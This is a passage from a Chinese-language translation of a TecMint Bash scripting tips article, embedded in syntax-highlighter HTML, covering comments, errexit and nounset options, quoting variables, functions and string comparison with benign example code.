!important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1cec733158094-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1cec733158094-1\"><span class=\"crayon-p\"># TecMint 是浏览各类 Linux 文章的最佳站点</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">2、 当运行失败时使脚本退出</h3>\n<p>有时即使某些命令运行失败，bash 可能继续去执行脚本，这样就影响到脚本的其余部分（会最终导致逻辑错误）。用下面的行的方式在遇到命令失败时来退出脚本执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1cfb588573577\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 如果命令运行失败让脚本退出执行\r\nset -o errexit \r\n# 或\r\nset -e</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1cfb588573577-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1cfb588573577-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1cfb588573577-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1cfb588573577-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1cfb588573577-1\"><span class=\"crayon-p\"># 如果命令运行失败让脚本退出执行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1cfb588573577-2\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">errexit</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1cfb588573577-3\"><span class=\"crayon-p\"># 或</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1cfb588573577-4\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">e</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_3\">3、 当 Bash 用未声明变量时使脚本退出</h3>\n<p>Bash 也可能会使用能导致起逻辑错误的未声明的变量。因此用下面行的方式去通知 bash 当它尝试去用一个未声明变量时就退出脚本执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d02234946221\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 若有用未设置的变量即让脚本退出执行\r\nset -o nounset\r\n# 或\r\nset -u</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d02234946221-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d02234946221-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d02234946221-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d02234946221-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d02234946221-1\"><span class=\"crayon-p\"># 若有用未设置的变量即让脚本退出执行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d02234946221-2\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nounset</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d02234946221-3\"><span class=\"crayon-p\"># 或</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d02234946221-4\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">4、 使用双引号来引用变量</h3>\n<p>当引用时（使用一个变量的值）用双引号有助于防止由于空格导致单词分割开和由于识别和扩展了通配符而导致的不必要匹配。</p>\n<p>看看下面的例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d07269624542\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\n# 若命令失败让脚本退出\r\nset -o errexit \r\n# 若未设置的变量被使用让脚本退出\r\nset -o nounset\r\necho \"Names without double quotes\" \r\necho\r\nnames=\"Tecmint FOSSMint Linusay\"\r\nfor name in $names; do\r\n  echo \"$name\"\r\ndone\r\necho\r\necho \"Names with double quotes\" \r\necho\r\nfor name in \"$names\"; do\r\n  echo \"$name\"\r\ndone\r\nexit 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d07269624542-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d07269624542-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-2\"><span class=\"crayon-p\"># 若命令失败让脚本退出</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-3\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">errexit</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-4\"><span class=\"crayon-p\"># 若未设置的变量被使用让脚本退出</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-5\"><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nounset</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-6\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Names without double quotes\"</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-7\"><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-8\"><span class=\"crayon-v\">names</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"Tecmint FOSSMint Linusay\"</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-9\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">name </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">names</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-10\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$name\"</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-11\"><span class=\"crayon-e\">done</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-12\"><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-13\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Names with double quotes\"</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-14\"><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-15\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">name </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$names\"</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-16\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$name\"</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d07269624542-17\"><span class=\"crayon-e\">done</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d07269624542-18\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>保存文件并退出，接着如下运行一下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d0d819902370\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ./names.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d0d819902370-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d0d819902370-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">names</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<p class=\"article_img\"><img class=\"aligncenter\" title=\"在脚本中用双引号\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201706/17/192227q13jnz3eeqq5pb53.png\" alt=\"在脚本中用双引号\"></p>\n<p class=\"article_img_desc\" style=\"text-align: center;\"><em>在脚本中用双引号</em></p>\n<h3 id=\"toc_5\">5、 在脚本中使用函数</h3>\n<p>除了非常小的脚本（只有几行代码），总是记得用函数来使代码模块化且使得脚本更可读和可重用。</p>\n<p>写函数的语法如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d1b944659771\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction check_root(){\r\n  command1; \r\n  command2;\r\n}\r\n# 或\r\ncheck_root(){\r\n  command1; \r\n  command2;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1b944659771-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d1b944659771-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1b944659771-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d1b944659771-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1b944659771-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d1b944659771-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1b944659771-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d1b944659771-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1b944659771-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1b944659771-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_root</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d1b944659771-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">command1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1b944659771-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">command2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d1b944659771-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1b944659771-5\"><span class=\"crayon-p\"># 或</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d1b944659771-6\"><span class=\"crayon-e\">check_root</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1b944659771-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">command1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d1b944659771-8\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">command2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1b944659771-9\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>写成单行代码时，每个命令后要用终止符号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d1f449127122\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncheck_root(){ command1; command2; }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d1f449127122-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d1f449127122-1\"><span class=\"crayon-e\">check_root</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">command1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">command2</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">6、 字符串比较时用 <code>=</code> 而不是 <code>==</code></h3>\n<p>注意 <code>==</code> 是 <code>=</code> 的同义词，因此仅用个单 <code>=</code> 来做字符串比较，例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d22808566024\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div 